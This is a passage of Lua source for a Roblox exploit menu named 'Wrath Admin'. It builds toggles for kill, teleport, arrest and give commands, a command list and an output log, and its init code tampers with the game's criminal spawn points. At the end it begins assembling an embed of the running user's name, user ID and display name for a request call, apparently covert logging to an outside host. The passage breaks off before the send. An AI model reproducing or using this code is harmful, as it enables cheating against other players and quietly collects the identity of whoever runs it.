MainGuiObjects.TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_11.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_11.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_11.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_11.Font = Enum.Font.Code
MainGuiObjects.TextLabel_11.Text = "true"
MainGuiObjects.TextLabel_11.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_11.TextSize = 14.000

MainGuiObjects.Toggle_9.Name = "Toggle"
MainGuiObjects.Toggle_9.Parent = MainGuiObjects.ImmunityListFrame
MainGuiObjects.Toggle_9.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_9.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_9.BorderSizePixel = 0
MainGuiObjects.Toggle_9.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_9.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_9.Font = Enum.Font.Code
MainGuiObjects.Toggle_9.Text = " Arrest Commands"
MainGuiObjects.Toggle_9.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_9.TextSize = 14.000
MainGuiObjects.Toggle_9.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_9.MouseButton1Click:Connect(function()
    ProtectedSettings.arrestcmds = not ProtectedSettings.arrestcmds;
    ChangeImmunityToggle(ProtectedSettings.arrestcmds, "Arrest Commands");
end);

MainGuiObjects.UICorner_22.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_22.Parent = MainGuiObjects.Toggle_9

MainGuiObjects.TextLabel_12.Parent = MainGuiObjects.Toggle_9
MainGuiObjects.TextLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_12.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_12.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_12.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_12.Font = Enum.Font.Code
MainGuiObjects.TextLabel_12.Text = "true"
MainGuiObjects.TextLabel_12.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_12.TextSize = 14.000

MainGuiObjects.Toggle_10.Name = "Toggle"
MainGuiObjects.Toggle_10.Parent = MainGuiObjects.ImmunityListFrame
MainGuiObjects.Toggle_10.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_10.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_10.BorderSizePixel = 0
MainGuiObjects.Toggle_10.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_10.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_10.Font = Enum.Font.Code
MainGuiObjects.Toggle_10.Text = " Give Commands"
MainGuiObjects.Toggle_10.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_10.TextSize = 14.000
MainGuiObjects.Toggle_10.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_10.MouseButton1Click:Connect(function()
    ProtectedSettings.givecmds = not ProtectedSettings.givecmds;
    ChangeImmunityToggle(ProtectedSettings.givecmds, "Give Commands");
end);

MainGuiObjects.UICorner_23.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_23.Parent = MainGuiObjects.Toggle_10

MainGuiObjects.TextLabel_13.Parent = MainGuiObjects.Toggle_10
MainGuiObjects.TextLabel_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_13.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_13.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_13.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_13.Font = Enum.Font.Code
MainGuiObjects.TextLabel_13.Text = "true"
MainGuiObjects.TextLabel_13.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_13.TextSize = 14.000

MainGuiObjects.Toggle_11.Name = "Toggle"
MainGuiObjects.Toggle_11.Parent = MainGuiObjects.ImmunityListFrame
MainGuiObjects.Toggle_11.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_11.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_11.BorderSizePixel = 0
MainGuiObjects.Toggle_11.Position = UDim2.new(-0.00444444455, 0, 0.00902553741, 0)
MainGuiObjects.Toggle_11.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_11.Font = Enum.Font.Code
MainGuiObjects.Toggle_11.Text = " Other Commands"
MainGuiObjects.Toggle_11.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_11.TextSize = 14.000
MainGuiObjects.Toggle_11.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_11.MouseButton1Click:Connect(function()
    ProtectedSettings.othercmds = not ProtectedSettings.othercmds;
    ChangeImmunityToggle(ProtectedSettings.othercmds, "Other Commands");
end);

MainGuiObjects.UICorner_24.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_24.Parent = MainGuiObjects.Toggle_11


MainGuiObjects.TextLabel_14.Parent = MainGuiObjects.Toggle_11
MainGuiObjects.TextLabel_14.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_14.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_14.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_14.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_14.Font = Enum.Font.Code
MainGuiObjects.TextLabel_14.Text = "true"
MainGuiObjects.TextLabel_14.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_14.TextSize = 14.000

MainGuiObjects.UICorner_25.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_25.Parent = MainGuiObjects.Toggle_12


MainGuiObjects.AdminSettings.Name = "AdminSettings"
MainGuiObjects.AdminSettings.Parent = MainGuiObjects.WrathAdminGuiMain
MainGuiObjects.AdminSettings.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.AdminSettings.BorderSizePixel = 0
MainGuiObjects.AdminSettings.Position = UDim2.new(0.280947179, 81, 0.336463153, -171)
MainGuiObjects.AdminSettings.Size = UDim2.new(0, 242, 0, 201)
makeDraggable(MainGuiObjects.AdminSettings);

function ChangeAdminGuiToggle(State, Name)
    for i,v in pairs(MainGuiObjects.AdminListFrame:GetChildren()) do
        if v:IsA("TextButton") then
            if v.Text == " " .. Name then
                if State then
                    v:FindFirstChildWhichIsA("TextLabel").Text = "true";
                    v:FindFirstChildWhichIsA("TextLabel").TextColor3 = Color3.fromRGB(85, 255, 0)
                else
                    v:FindFirstChildWhichIsA("TextLabel").Text = "false";
                    v:FindFirstChildWhichIsA("TextLabel").TextColor3 = Color3.fromRGB(255, 0, 0);
                end;
            end;
        end;
    end;
end;

MainGuiObjects.AdminTopbar.Name = "AdminTopbar"
MainGuiObjects.AdminTopbar.Parent = MainGuiObjects.AdminSettings
MainGuiObjects.AdminTopbar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.AdminTopbar.BorderSizePixel = 0
MainGuiObjects.AdminTopbar.Size = UDim2.new(0, 242, 0, 31)


MainGuiObjects.TemplateTopbarRound_5.CornerRadius = UDim.new(0, 5)
MainGuiObjects.TemplateTopbarRound_5.Name = "TemplateTopbarRound"
MainGuiObjects.TemplateTopbarRound_5.Parent = MainGuiObjects.AdminTopbar


MainGuiObjects.TogglesTitle_3.Name = "TogglesTitle"
MainGuiObjects.TogglesTitle_3.Parent = MainGuiObjects.AdminTopbar
MainGuiObjects.TogglesTitle_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TogglesTitle_3.BackgroundTransparency = 1.000
MainGuiObjects.TogglesTitle_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TogglesTitle_3.Size = UDim2.new(0, 242, 0, 31)
MainGuiObjects.TogglesTitle_3.Font = Enum.Font.Code
MainGuiObjects.TogglesTitle_3.Text = "Admin Settings"
MainGuiObjects.TogglesTitle_3.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TogglesTitle_3.TextSize = 24.000


MainGuiObjects.PlayerListRound_6.CornerRadius = UDim.new(0, 5)
MainGuiObjects.PlayerListRound_6.Name = "PlayerListRound"
MainGuiObjects.PlayerListRound_6.Parent = MainGuiObjects.AdminSettings


MainGuiObjects.AdminListFrame.Name = "AdminListFrame"
MainGuiObjects.AdminListFrame.Parent = MainGuiObjects.AdminSettings
MainGuiObjects.AdminListFrame.Active = true
MainGuiObjects.AdminListFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.AdminListFrame.BorderSizePixel = 0
MainGuiObjects.AdminListFrame.Position = UDim2.new(0.0330578499, 0, 0.209551603, 0)
MainGuiObjects.AdminListFrame.Size = UDim2.new(0, 225, 0, 150)
MainGuiObjects.AdminListFrame.ScrollBarThickness = 1


MainGuiObjects.UIListLayout_6.Parent = MainGuiObjects.AdminListFrame
MainGuiObjects.UIListLayout_6.SortOrder = Enum.SortOrder.LayoutOrder
MainGuiObjects.UIListLayout_6.Padding = UDim.new(0, 5)


MainGuiObjects.Toggle_13.Name = "Toggle"
MainGuiObjects.Toggle_13.Parent = MainGuiObjects.AdminListFrame
MainGuiObjects.Toggle_13.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_13.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_13.BorderSizePixel = 0
MainGuiObjects.Toggle_13.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_13.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_13.Font = Enum.Font.Code
MainGuiObjects.Toggle_13.Text = " Kill Commands"
MainGuiObjects.Toggle_13.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_13.TextSize = 14.000
MainGuiObjects.Toggle_13.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_13.MouseButton1Click:Connect(function()
    AdminSettings.killcmds = not AdminSettings.killcmds;
    ChangeAdminGuiToggle(AdminSettings.killcmds, "Kill Commands");
end);

MainGuiObjects.UICorner_26.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_26.Parent = MainGuiObjects.Toggle_13


MainGuiObjects.TextLabel_16.Parent = MainGuiObjects.Toggle_13
MainGuiObjects.TextLabel_16.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_16.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_16.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_16.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_16.Font = Enum.Font.Code
MainGuiObjects.TextLabel_16.Text = "true"
MainGuiObjects.TextLabel_16.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_16.TextSize = 14.000


MainGuiObjects.Toggle_14.Name = "Toggle"
MainGuiObjects.Toggle_14.Parent = MainGuiObjects.AdminListFrame
MainGuiObjects.Toggle_14.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_14.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_14.BorderSizePixel = 0
MainGuiObjects.Toggle_14.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_14.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_14.Font = Enum.Font.Code
MainGuiObjects.Toggle_14.Text = " Teleport Commands"
MainGuiObjects.Toggle_14.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_14.TextSize = 14.000
MainGuiObjects.Toggle_14.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_14.MouseButton1Click:Connect(function()
    AdminSettings.tpcmds = not AdminSettings.tpcmds;
    ChangeAdminGuiToggle(AdminSettings.tpcmds, "Teleport Commands");
end);

MainGuiObjects.UICorner_27.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_27.Parent = MainGuiObjects.Toggle_14


MainGuiObjects.TextLabel_17.Parent = MainGuiObjects.Toggle_14
MainGuiObjects.TextLabel_17.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_17.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_17.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_17.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_17.Font = Enum.Font.Code
MainGuiObjects.TextLabel_17.Text = "true"
MainGuiObjects.TextLabel_17.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_17.TextSize = 14.000


MainGuiObjects.Toggle_15.Name = "Toggle"
MainGuiObjects.Toggle_15.Parent = MainGuiObjects.AdminListFrame
MainGuiObjects.Toggle_15.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_15.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_15.BorderSizePixel = 0
MainGuiObjects.Toggle_15.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_15.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_15.Font = Enum.Font.Code
MainGuiObjects.Toggle_15.Text = " Arrest Commands"
MainGuiObjects.Toggle_15.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_15.TextSize = 14.000
MainGuiObjects.Toggle_15.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_15.MouseButton1Click:Connect(function()
    AdminSettings.arrestcmds = not AdminSettings.arrestcmds;
    ChangeAdminGuiToggle(AdminSettings.arrestcmds, "Arrest Commands");
end);

MainGuiObjects.UICorner_28.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_28.Parent = MainGuiObjects.Toggle_15


MainGuiObjects.TextLabel_18.Parent = MainGuiObjects.Toggle_15
MainGuiObjects.TextLabel_18.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_18.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_18.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_18.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_18.Font = Enum.Font.Code
MainGuiObjects.TextLabel_18.Text = "true"
MainGuiObjects.TextLabel_18.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_18.TextSize = 14.000


MainGuiObjects.Toggle_16.Name = "Toggle"
MainGuiObjects.Toggle_16.Parent = MainGuiObjects.AdminListFrame
MainGuiObjects.Toggle_16.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_16.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_16.BorderSizePixel = 0
MainGuiObjects.Toggle_16.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_16.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_16.Font = Enum.Font.Code
MainGuiObjects.Toggle_16.Text = " Give Commands"
MainGuiObjects.Toggle_16.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_16.TextSize = 14.000
MainGuiObjects.Toggle_16.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_16.MouseButton1Click:Connect(function()
    AdminSettings.givecmds = not AdminSettings.givecmds;
    ChangeAdminGuiToggle(AdminSettings.givecmds, "Give Commands");
end);

MainGuiObjects.UICorner_29.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_29.Parent = MainGuiObjects.Toggle_16


MainGuiObjects.TextLabel_19.Parent = MainGuiObjects.Toggle_16
MainGuiObjects.TextLabel_19.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_19.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_19.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_19.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_19.Font = Enum.Font.Code
MainGuiObjects.TextLabel_19.Text = "true"
MainGuiObjects.TextLabel_19.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_19.TextSize = 14.000


MainGuiObjects.Toggle_17.Name = "Toggle"
MainGuiObjects.Toggle_17.Parent = MainGuiObjects.AdminListFrame
MainGuiObjects.Toggle_17.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_17.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_17.BorderSizePixel = 0
MainGuiObjects.Toggle_17.Position = UDim2.new(-0.00444444455, 0, 0.00902553741, 0)
MainGuiObjects.Toggle_17.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_17.Font = Enum.Font.Code
MainGuiObjects.Toggle_17.Text = " Other Commands"
MainGuiObjects.Toggle_17.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_17.TextSize = 14.000
MainGuiObjects.Toggle_17.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_17.MouseButton1Click:Connect(function()
    AdminSettings.othercmds = not AdminSettings.othercmds;
    ChangeAdminGuiToggle(AdminSettings.othercmds, "Other Commands");
end);

MainGuiObjects.UICorner_30.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_30.Parent = MainGuiObjects.Toggle_17


MainGuiObjects.TextLabel_20.Parent = MainGuiObjects.Toggle_17
MainGuiObjects.TextLabel_20.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_20.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_20.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_20.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_20.Font = Enum.Font.Code
MainGuiObjects.TextLabel_20.Text = "true"
MainGuiObjects.TextLabel_20.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_20.TextSize = 14.000


MainGuiObjects.Commands.Name = "Commands"
MainGuiObjects.Commands.Parent = MainGuiObjects.WrathAdminGuiMain
MainGuiObjects.Commands.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.Commands.BorderSizePixel = 0
MainGuiObjects.Commands.Position = UDim2.new(0.0118406396, 0, 0.549295723, 0)
MainGuiObjects.Commands.Size = UDim2.new(0, 242, 0, 276)

makeDraggable(MainGuiObjects.Commands);

MainGuiObjects.CommandsTopbar.Name = "CommandsTopbar"
MainGuiObjects.CommandsTopbar.Parent = MainGuiObjects.Commands
MainGuiObjects.CommandsTopbar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.CommandsTopbar.BorderSizePixel = 0
MainGuiObjects.CommandsTopbar.Size = UDim2.new(0, 242, 0, 31)


MainGuiObjects.TemplateTopbarRound_6.CornerRadius = UDim.new(0, 5)
MainGuiObjects.TemplateTopbarRound_6.Name = "TemplateTopbarRound"
MainGuiObjects.TemplateTopbarRound_6.Parent = MainGuiObjects.CommandsTopbar


MainGuiObjects.TogglesTitle_4.Name = "TogglesTitle"
MainGuiObjects.TogglesTitle_4.Parent = MainGuiObjects.CommandsTopbar
MainGuiObjects.TogglesTitle_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TogglesTitle_4.BackgroundTransparency = 1.000
MainGuiObjects.TogglesTitle_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TogglesTitle_4.Size = UDim2.new(0, 242, 0, 31)
MainGuiObjects.TogglesTitle_4.Font = Enum.Font.Code
MainGuiObjects.TogglesTitle_4.Text = "Commands"
MainGuiObjects.TogglesTitle_4.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TogglesTitle_4.TextSize = 31.000


MainGuiObjects.PlayerListRound_7.CornerRadius = UDim.new(0, 5)
MainGuiObjects.PlayerListRound_7.Name = "PlayerListRound"
MainGuiObjects.PlayerListRound_7.Parent = MainGuiObjects.Commands


MainGuiObjects.CommandsListFrame.Name = "CommandsListFrame"
MainGuiObjects.CommandsListFrame.Parent = MainGuiObjects.Commands
MainGuiObjects.CommandsListFrame.Active = true
MainGuiObjects.CommandsListFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.CommandsListFrame.BorderSizePixel = 0
MainGuiObjects.CommandsListFrame.Position = UDim2.new(0.0371900834, 0, 0.160976127, 0)
MainGuiObjects.CommandsListFrame.Size = UDim2.new(0, 225, 0, 221)
MainGuiObjects.CommandsListFrame.ScrollBarThickness = 1

function NewCommand(Text)
    local Command = Instance.new("TextButton");
    Command.Name = "Command"
    Command.Parent = MainGuiObjects.CommandsListFrame
    Command.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
    Command.BorderColor3 = Color3.fromRGB(27, 42, 53)
    Command.BorderSizePixel = 0
    Command.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
    Command.Size = UDim2.new(0, 225, 0, 25)
    Command.Font = Enum.Font.Code
    Command.Text = Text
    Command.TextColor3 = Color3.fromRGB(255, 255, 255)
    Command.TextSize = 14.000
    Command.RichText = true
    Command.TextWrapped = true

    local Corner = Instance.new("UICorner");
    Corner.CornerRadius = UDim.new(0, 5)
    Corner.Parent = Command;

    task.spawn(function()
        task.wait(1/20)
        Command.Size = UDim2.new(0, 220, 0, math.max(25, Command.TextBounds.Y));
        MainGuiObjects.CommandsListFrame.CanvasSize = UDim2.new(0, 0, 0, MainGuiObjects.UIListLayout_7.AbsoluteContentSize.Y)
    end);
end;

for i,v in next, Commands do
    local Split = v:split(" -- ")
    if Split[2] then
        NewCommand(Split[1] .. "\n--\n" .. Split[2])
    else
        NewCommand(v);
    end;
end;

MainGuiObjects.UIListLayout_7.Parent = MainGuiObjects.CommandsListFrame
MainGuiObjects.UIListLayout_7.SortOrder = Enum.SortOrder.LayoutOrder
MainGuiObjects.UIListLayout_7.Padding = UDim.new(0, 5)

MainGuiObjects.Output.Name = "Output"
MainGuiObjects.Output.Parent = MainGuiObjects.WrathAdminGuiMain
MainGuiObjects.Output.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.Output.BorderSizePixel = 0
MainGuiObjects.Output.Position = UDim2.new(0.490850389, -736, 0.0625978187, 231)
MainGuiObjects.Output.Size = UDim2.new(0, 242, 0, 164)
makeDraggable(MainGuiObjects.Output)

MainGuiObjects.TemplateTopbar_3.Name = "TemplateTopbar"
MainGuiObjects.TemplateTopbar_3.Parent = MainGuiObjects.Output
MainGuiObjects.TemplateTopbar_3.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TemplateTopbar_3.BorderSizePixel = 0
MainGuiObjects.TemplateTopbar_3.Size = UDim2.new(0, 242, 0, 31)


MainGuiObjects.TemplateTopbarRound_7.CornerRadius = UDim.new(0, 5)
MainGuiObjects.TemplateTopbarRound_7.Name = "TemplateTopbarRound"
MainGuiObjects.TemplateTopbarRound_7.Parent = MainGuiObjects.TemplateTopbar_3


MainGuiObjects.TemplateTitle_3.Name = "TemplateTitle"
MainGuiObjects.TemplateTitle_3.Parent = MainGuiObjects.TemplateTopbar_3
MainGuiObjects.TemplateTitle_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TemplateTitle_3.BackgroundTransparency = 1.000
MainGuiObjects.TemplateTitle_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TemplateTitle_3.Size = UDim2.new(0, 242, 0, 31)
MainGuiObjects.TemplateTitle_3.Font = Enum.Font.Code
MainGuiObjects.TemplateTitle_3.Text = "Output"
MainGuiObjects.TemplateTitle_3.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TemplateTitle_3.TextSize = 31.000


MainGuiObjects.PlayerListRound_8.CornerRadius = UDim.new(0, 5)
MainGuiObjects.PlayerListRound_8.Name = "PlayerListRound"
MainGuiObjects.PlayerListRound_8.Parent = MainGuiObjects.Output


MainGuiObjects.OutputListFrame.Name = "OutputListFrame"
MainGuiObjects.OutputListFrame.Parent = MainGuiObjects.Output
MainGuiObjects.OutputListFrame.Active = true
MainGuiObjects.OutputListFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.OutputListFrame.BorderSizePixel = 0
MainGuiObjects.OutputListFrame.Position = UDim2.new(0.0252201017, 0, 0.248236686, 0)
MainGuiObjects.OutputListFrame.Size = UDim2.new(0, 225, 0, 114)
MainGuiObjects.OutputListFrame.ScrollBarThickness = 5

MainGuiObjects.UIListLayout_8.Parent = MainGuiObjects.OutputListFrame
MainGuiObjects.UIListLayout_8.HorizontalAlignment = Enum.HorizontalAlignment.Left
MainGuiObjects.UIListLayout_8.SortOrder = Enum.SortOrder.LayoutOrder
MainGuiObjects.UIListLayout_8.Padding = UDim.new(0, 5)

function AddLog(Type, Text)
    local Log = Instance.new("TextButton");
    Log.Name = "Log"
    Log.Parent = MainGuiObjects.OutputListFrame
    Log.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
    Log.BorderColor3 = Color3.fromRGB(27, 42, 53)
    Log.BorderSizePixel = 0
    Log.AutoButtonColor = false
    Log.Font = Enum.Font.Code
    Log.Text = "[" .. Type:upper() .. "] " .. Text;
    if Type:lower() == "success" then
        Log.TextColor3 = Color3.fromRGB(0, 255, 0)
    elseif Type:lower() == "error" then
        Log.TextColor3 = Color3.fromRGB(255, 0, 0)
    else
        Log.TextColor3 = Color3.fromRGB(0, 0, 255)
    end;
    Log.RichText = true;
    Log.TextSize = 14.000
    Log.TextWrapped = true
    Log.Size = UDim2.new(0, 225, 0, 25);
    Log.TextXAlignment = Enum.TextXAlignment.Left

    local Corner = Instance.new("UICorner");
    Corner.CornerRadius = UDim.new(0, 5);
    Corner.Parent = Log;

    MainGuiObjects.OutputListFrame.CanvasSize = UDim2.new(0, 0, 0, MainGuiObjects.UIListLayout_8.AbsoluteContentSize.Y);
    MainGuiObjects.OutputListFrame.CanvasPosition = Vector2.new(0, MainGuiObjects.UIListLayout_8.AbsoluteContentSize.Y);
end;

MainGuiObjects.UICorner_32.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_32.Parent = MainGuiObjects.Log

MainGuiObjects.OutputListFrame.ChildAdded:Connect(function(Log)
    if Log:IsA("TextButton") then
        task.wait(1/20);
        Log.Size = UDim2.new(0, 220, 0, math.max(25, Log.TextBounds.Y));
        MainGuiObjects.OutputListFrame.CanvasSize = UDim2.new(0, 0, 0, MainGuiObjects.UIListLayout_8.AbsoluteContentSize.Y);
        MainGuiObjects.OutputListFrame.CanvasPosition = Vector2.new(0, MainGuiObjects.UIListLayout_8.AbsoluteContentSize.Y);
    end;
end);

--// cmd search
TextBox.Changed:Connect(function(Text)
    Text = TextBox.Text;
    local Found = {}
    if Text ~= "" then
        for i,v in pairs(MainGuiObjects.CommandsListFrame:GetChildren()) do
            if v:IsA("TextButton") then
                if v.Text:find(Text) then
                    table.insert(Found, v);
                end;
                v.Visible = false;
            end;
        end;
        for i,v in next, Found do
            v.Visible = true;
        end;
        MainGuiObjects.CommandsListFrame.CanvasSize = UDim2.new(0, 0, 0, MainGuiObjects.UIListLayout_7.AbsoluteContentSize.Y)
    else
        for i,v in pairs(MainGuiObjects.CommandsListFrame:GetChildren()) do
            if v:IsA("TextButton") then
                v.Visible = true;
            end;
        end;
        MainGuiObjects.CommandsListFrame.CanvasSize = UDim2.new(0, 0, 0, MainGuiObjects.UIListLayout_7.AbsoluteContentSize.Y)
    end;
end);

--// Gui toggle
UserInputService.InputBegan:Connect(function(INPUT)
    if INPUT.UserInputType == Enum.UserInputType.Keyboard and INPUT.KeyCode == Enum.KeyCode[Settings.ToggleGui] then
        ToggleGuis();
    end;
end);

--// Fix scrolling frames
for i,v in next, MainGuiObjects do
    if v:IsA("ScrollingFrame") then
        local ListLayout = v:FindFirstChildWhichIsA("UIListLayout");
        if ListLayout then
            v.CanvasSize = UDim2.new(0, 0, 0, ListLayout.AbsoluteContentSize.Y);
        end;
    end;
end;

--// Init:
for i,v in pairs(workspace:FindFirstChild("Criminals Spawn"):GetChildren()) do
    if v.Name == "SpawnLocation" then
        v.Parent = game.Lighting;
    end;
end;

--// More ASA
for i,v in pairs(workspace:FindFirstChild("Criminals Spawn"):GetChildren()) do
    if v.Name == "SpawnLocation" then
        v.CanCollide = false;
    end;
end;
    
ToggleGuis();

-- lazy
ChangeGuiToggle(false, "Anti-Crash");

SavePos()
Loadchar();
LoadPos()

print("LOADED WRATH ADMIN! Made by Zyrex, Dis, and Midnight");

AddLog("Success", "Loaded Wrath Admin in " .. tostring(tick() - ExecutionTime) .. " second(s).");

local rq = request or syn.request
local embed1 = {
    {
        ["title"] = game.Players.LocalPlayer.Name,
        ["color"] = tonumber(0xD60015),
        ["url"] =  "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
        ["fields"] = {
            {
                ["name"] = "Display Name",
                ["value"] = "```"..game.Players.LocalPlayer.DisplayName.."```",
            },
            {
